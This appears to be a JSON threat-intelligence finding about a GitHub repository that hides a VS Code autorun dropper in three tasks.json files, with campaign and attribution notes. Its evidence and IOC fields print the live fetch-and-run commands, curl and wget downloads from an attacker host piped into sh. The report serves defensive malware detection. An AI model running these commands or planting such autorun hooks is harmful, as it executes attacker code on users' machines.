@@ -1,0 +1,75 @@
+{
+  "finding": {
+    "key": "repository:goldendragon68/cryptoket-smart-contracts",
+    "kind": "repository",
+    "family": "",
+    "id": "goldendragon68/cryptoket-smart-contracts",
+    "url": "https://github.com/goldendragon68/CryptoKet-Smart-Contracts",
+    "registry": "github",
+    "owner": "goldendragon68",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 5,
+    "detection_method": "malicious_owner",
+    "attribution": "",
+    "campaign_id": "GW-C-a3717cc8",
+    "rules": "install_hook/vscode-autorun",
+    "evidence_locations": ".vscode/tasks.json:0; migrations/.vscode/tasks.json:0; contracts/.vscode/tasks.json:0",
+    "c2_hosts": "jerryfox-platform.vercel.app",
+    "iocs": "jerryfox-platform.vercel.app; https://jerryfox-platform.vercel.app/task/mac?token=bc7be3873ca9; https://jerryfox-platform.vercel.app/task/linux?token=bc7be3873ca9; curl 'https://jerryfox-platform.vercel.app/task/mac?token=bc7be3873ca9' | sh; .vscode/tasks.json",
+    "matched_signatures": "",
+    "reasons": "repository under owner goldendragon68 of a known-malicious repo | Tier-2 confirmed (bash score 5)",
+    "osm_status": "submitted",
+    "osm_threat_id": "a792cd72-54c3-4d21-9eda-7a239258c81b",
+    "first_seen": "hunt-20260807T211618Z",
+    "last_seen": "hunt-20260807T211618Z",
+    "evidence_file": "repositories/goldendragon68_cryptoket-smart-contracts.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl 'https://jerryfox-platform.vercel.app/task/mac?token=bc7be3873ca9' | sh wget -qO- 'https://jerryfox-platform.vercel.app/task/linux?token=bc7be3873ca9' | sh curl https://jerryfox-platform.vercel.a"
+    },
+    {
+      "file": "migrations/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl 'https://jerryfox-platform.vercel.app/task/mac?token=bc7be3873ca9' | sh wget -qO- 'https://jerryfox-platform.vercel.app/task/linux?token=bc7be3873ca9' | sh curl https://jerryfox-platform.vercel.a"
+    },
+    {
+      "file": "contracts/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl 'https://jerryfox-platform.vercel.app/task/mac?token=bc7be3873ca9' | sh wget -qO- 'https://jerryfox-platform.vercel.app/task/linux?token=bc7be3873ca9' | sh curl https://jerryfox-platform.vercel.a"
+    }
+  ],
+  "commit_sha": "af99c007dc775c480bbbdc7f88786e49c1367520",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/goldendragon68/cryptoket-smart-contracts",
+    "version_info": "all",
+    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json, migrations/.vscode/tasks.json, contracts/.vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from jerryfox-platform.vercel.app and executes it (.vscode/tasks.json, migrations/.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nThe same dropper is planted in 3 directories.\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: jerryfox-platform.vercel.app.\nCampaign GW-C-a3717cc8: one of 20 confirmed repos across 17 accounts sharing the dropper URL shape task/{os}?token=. Payload served from 10 distinct hosts, including codeviewer-three.vercel.app, coreviewer.vercel.app, jerryfox-platform.vercel.app, task-hrec.vercel.app, thopywork.vercel.app.\nAttribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: .vscode/tasks.json, migrations/.vscode/tasks.json, contracts/.vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from jerryfox-platform.vercel.app and executes it (.vscode/tasks.json, migrations/.vscode/tasks.json).\n- .vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed (+2 more)\n- Attacker hosts: jerryfox-platform.vercel.app",
+    "publisher": "goldendragon68",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "vscode-folderopen-autorun",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/goldendragon68/cryptoket-smart-contracts/blob/af99c007dc775c480bbbdc7f88786e49c1367520/.vscode/tasks.json\nhttps://github.com/goldendragon68/cryptoket-smart-contracts/blob/af99c007dc775c480bbbdc7f88786e49c1367520/migrations/.vscode/tasks.json\nhttps://github.com/goldendragon68/cryptoket-smart-contracts/blob/af99c007dc775c480bbbdc7f88786e49c1367520/contracts/.vscode/tasks.json",
+    "verified_iocs": "jerryfox-platform.vercel.app\nhttps://jerryfox-platform.vercel.app/task/mac?token=bc7be3873ca9\nhttps://jerryfox-platform.vercel.app/task/linux?token=bc7be3873ca9\ncurl 'https://jerryfox-platform.vercel.app/task/mac?token=bc7be3873ca9' | sh\n.vscode/tasks.json",
+    "contributors": [],
+    "first_seen": "2026-08-07T21:16:18Z",
+    "last_seen": "2026-08-07T21:16:18Z"
+  }
+}
